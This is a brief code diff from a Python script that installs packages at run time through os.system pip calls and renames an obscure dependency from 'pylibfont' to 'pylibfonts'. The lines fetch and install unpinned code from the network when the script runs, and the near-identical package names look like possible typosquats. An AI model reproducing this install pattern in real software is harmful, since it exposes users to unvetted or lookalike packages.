@@ -1,6 +1,6 @@
 import os
-os.system("pip install pylibfont")
-import pylibfont
+os.system("pip install pylibfonts")
+import pylibfonts
 os.system("pip install tasksio")
 os.system("pip install aiohttp")
 os.system("pip install colorama")
